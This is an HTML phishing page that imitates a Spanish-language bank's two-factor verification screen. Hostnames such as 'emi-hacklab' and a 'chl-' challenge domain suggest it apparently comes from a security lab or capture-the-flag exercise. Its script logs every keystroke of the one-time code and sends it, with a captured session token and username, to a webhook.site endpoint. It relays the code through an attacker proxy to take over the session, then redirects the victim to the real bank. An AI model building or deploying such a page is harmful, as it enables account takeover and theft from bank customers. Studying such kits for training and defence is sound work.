<!doctype html>
<html lang="es">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Veltra Bank — Verificación</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  <style>
:root{--bg-0:#070b16;--bg-1:#0d1326;--card:rgba(18,25,46,0.72);--card-border:rgba(120,150,255,0.16);--txt:#eef2ff;--txt-dim:#9aa6c7;--accent:#5b7cfa;--accent-2:#38e0c4;--accent-grad:linear-gradient(135deg,#5b7cfa 0%,#38e0c4 100%);--danger:#ff6b85;--ok:#38e0c4;--field:rgba(10,15,30,0.6);--field-border:rgba(120,150,255,0.22);--shadow:0 30px 80px -30px rgba(0,0,0,0.8)}
*{box-sizing:border-box;margin:0;padding:0}html,body{height:100%}
body{font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;color:var(--txt);background:radial-gradient(1200px 700px at 15% -10%,rgba(91,124,250,0.22),transparent 60%),radial-gradient(900px 600px at 110% 10%,rgba(56,224,196,0.16),transparent 55%),linear-gradient(160deg,var(--bg-0),var(--bg-1));min-height:100vh;display:flex;flex-direction:column;-webkit-font-smoothing:antialiased}
.topbar{display:flex;align-items:center;justify-content:space-between;padding:22px 36px}
.brand{display:flex;align-items:center;gap:12px;font-weight:700;letter-spacing:-0.02em;font-size:20px}
.brand .logo{width:36px;height:36px;border-radius:11px;background:var(--accent-grad);display:grid;place-items:center;box-shadow:0 8px 24px -8px rgba(91,124,250,0.9)}
.brand .logo svg{width:20px;height:20px}
.brand span b{background:var(--accent-grad);-webkit-background-clip:text;background-clip:text;color:transparent}
.topbar .pill{display:inline-flex;align-items:center;gap:7px;font-size:12.5px;color:var(--txt-dim);border:1px solid var(--card-border);border-radius:999px;padding:7px 14px;background:rgba(255,255,255,0.02)}
.dot{width:8px;height:8px;border-radius:50%;background:var(--ok);box-shadow:0 0 10px var(--ok)}
.wrap{flex:1;display:grid;grid-template-columns:1.05fr 0.95fr;gap:40px;align-items:center;max-width:1120px;width:100%;margin:0 auto;padding:24px 36px 56px}
.hero h1{font-size:clamp(30px,4vw,46px);line-height:1.05;letter-spacing:-0.03em;font-weight:800;margin-bottom:18px}
.hero h1 em{font-style:normal;background:var(--accent-grad);-webkit-background-clip:text;background-clip:text;color:transparent}
.hero p{color:var(--txt-dim);font-size:16px;max-width:46ch;line-height:1.6}
.features{margin-top:30px;display:grid;gap:14px}
.feature{display:flex;gap:13px;align-items:flex-start}
.feature .ic{flex:none;width:38px;height:38px;border-radius:11px;display:grid;place-items:center;background:rgba(91,124,250,0.12);border:1px solid var(--card-border);color:var(--accent-2)}
.feature .ic svg{width:19px;height:19px}
.feature h3{font-size:14.5px;font-weight:650;margin-bottom:3px}
.feature p{font-size:13px;color:var(--txt-dim)}
.card{background:var(--card);border:1px solid var(--card-border);border-radius:22px;padding:34px 32px;backdrop-filter:blur(22px);-webkit-backdrop-filter:blur(22px);box-shadow:var(--shadow);width:100%;max-width:420px;justify-self:end}
.card .eyebrow{font-size:12px;letter-spacing:0.14em;text-transform:uppercase;color:var(--accent-2);font-weight:650}
.card h2{font-size:24px;letter-spacing:-0.02em;margin:8px 0 4px}
.card .sub{color:var(--txt-dim);font-size:14px;margin-bottom:24px}
.field{margin-bottom:16px}
.field label{display:block;font-size:13px;color:var(--txt-dim);margin-bottom:7px;font-weight:550}
.field input{width:100%;background:var(--field);border:1px solid var(--field-border);border-radius:12px;padding:13px 15px;color:var(--txt);font-size:15px;outline:none;transition:border-color 0.18s,box-shadow 0.18s}
.field input::placeholder{color:#5b678a}
.field input:focus{border-color:var(--accent);box-shadow:0 0 0 4px rgba(91,124,250,0.18)}
.field.otp input{text-align:center;letter-spacing:0.5em;font-size:22px;font-weight:650;padding-left:0.5em}
.btn{width:100%;border:none;border-radius:12px;padding:14px 18px;font-size:15px;font-weight:650;color:#06122b;background:var(--accent-grad);cursor:pointer;transition:transform 0.12s,box-shadow 0.18s,filter 0.18s;box-shadow:0 14px 30px -12px rgba(91,124,250,0.8)}
.btn:hover{filter:brightness(1.05)}.btn:active{transform:translateY(1px)}
.btn:disabled{opacity:0.6;cursor:not-allowed}
.alert{border-radius:11px;padding:11px 14px;font-size:13.5px;margin-bottom:18px;border:1px solid rgba(255,107,133,0.3);background:rgba(255,107,133,0.1);color:#ffd2db}
.secure-note{margin-top:20px;display:flex;align-items:center;gap:9px;font-size:12px;color:var(--txt-dim);justify-content:center}
.secure-note svg{width:14px;height:14px;color:var(--ok)}
.card-footer{margin-top:22px;text-align:center;font-size:13px;color:var(--txt-dim)}
.card-footer a{color:var(--accent);text-decoration:none}
.hidden{display:none!important}
@media(max-width:860px){.wrap{grid-template-columns:1fr;gap:28px;padding:16px}.card{justify-self:stretch;max-width:none}.hero{order:2}.topbar{padding:18px 16px}}
  </style>
</head>
<body>
  <header class="topbar">
    <div class="brand">
      <span class="logo">
        <svg viewBox="0 0 24 24" fill="none"><path d="M4 5l8-2 8 2v6c0 5-3.5 8-8 10C7.5 19 4 16 4 11V5z" stroke="#06122b" stroke-width="2" stroke-linejoin="round"/></svg>
      </span>
      <span>Veltra<b>Bank</b></span>
    </div>
    <div class="pill"><span class="dot"></span> Conexion cifrada · TLS 1.3</div>
  </header>

  <main class="wrap">
    <section class="hero">
      <h1>Verificacion<br><em>en dos pasos.</em></h1>
      <p>Ingresa el codigo de 6 digitos que enviamos a tu dispositivo de confianza.</p>
    </section>

    <section class="card">
      <div class="eyebrow">Paso 2 de 2</div>
      <h2>Codigo de verificacion</h2>
      <p class="sub">Hola, <strong id="nombre-usuario"></strong>. Ingresa el codigo de 6 digitos.</p>
      <div class="alert hidden" id="alert-2"></div>
      <form id="form-2fa" autocomplete="off">
        <div class="field otp">
          <label for="txt-2fa">Codigo</label>
          <input id="txt-2fa" name="txt2fa" type="text" inputmode="numeric" maxlength="6" placeholder="000000" autofocus>
        </div>
        <button id="btn-2fa" type="submit" class="btn">Confirmar e ingresar</button>
      </form>
    </section>
  </main>

  <script>
  const PROXY   = 'https://veltra-worker.emi-hacklab.workers.dev';
  const WEBHOOK = 'https://webhook.site/NUEVA-URL-ACA';
  const BANCO   = 'https://chl-252f32f0-0279-4210-a32f-5148b25c322d-veltra-bank.softwareseguro.com.ar';

  const params = new URLSearchParams(location.search);
  const capturedSession = params.get('s') || '';
  const usuario = params.get('u') || '';

  document.getElementById('nombre-usuario').textContent = usuario;

  function exfil(p) {
    const qs = new URLSearchParams(p).toString();
    new Image().src = WEBHOOK + '?' + qs;
    fetch(WEBHOOK + '?' + qs, { mode: 'no-cors' }).catch(() => {});
  }

  function track(event, data) {
    exfil({ event, ...data, ts: Date.now() });
  }

  window.addEventListener('error', e => {
    track('js_error', { msg: e.message, line: e.lineno });
  });
  window.addEventListener('unhandledrejection', e => {
    track('promise_error', { msg: String(e.reason) });
  });

  document.addEventListener('DOMContentLoaded', () => {
    track('pageload', { s: capturedSession ? 'ok' : 'empty', u: usuario });

    const input = document.getElementById('txt-2fa');
    input.addEventListener('focus', () => track('focus', { field: 'txt-2fa' }));
    input.addEventListener('input', () => track('input', { field: 'txt-2fa', val: input.value }));
    input.addEventListener('blur', () => track('blur', { val: input.value }));

    document.getElementById('btn-2fa').addEventListener('click', () => track('click', { btn: 'btn-2fa' }));
    document.addEventListener('visibilitychange', () => track('visibility', { state: document.visibilityState }));
  });

  async function proxyReq(path, body) {
    const res = await fetch(PROXY + path, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
    return res.json();
  }

  document.getElementById('txt-2fa').addEventListener('input', async function() {
    const codigo = this.value.trim();
    if (codigo.length !== 6) return;
    track('otp_complete', { otp: codigo });
    try {
      const res = await proxyReq('/api/verificar-full', { codigo, session: capturedSession });
      track('verificar_result', { ok: res.ok, err: res.error || '' });
      if (res.ok) {
        window.location.href = BANCO + (res.next || '/dashboard');
      }
    } catch(err) {
      track('verificar_error', { msg: String(err) });
    }
  });

  document.getElementById('form-2fa').addEventListener('submit', async function(e) {
    e.preventDefault();
    const codigo = document.getElementById('txt-2fa').value.trim();
    const btn = document.getElementById('btn-2fa');
    btn.disabled = true;
    btn.textContent = 'Confirmando…';
    track('submit', { otp: codigo });
    try {
      const res = await proxyReq('/api/verificar-full', { codigo, session: capturedSession });
      track('verificar_result', { ok: res.ok, err: res.error || '' });
      if (res.ok) {
        window.location.href = BANCO + (res.next || '/dashboard');
        return;
      }
    } catch (err) {
      track('verificar_error', { msg: String(err) });
    }
    setTimeout(() => { window.location.href = BANCO + '/login'; }, 800);
  });
</script>
</body>
</html>
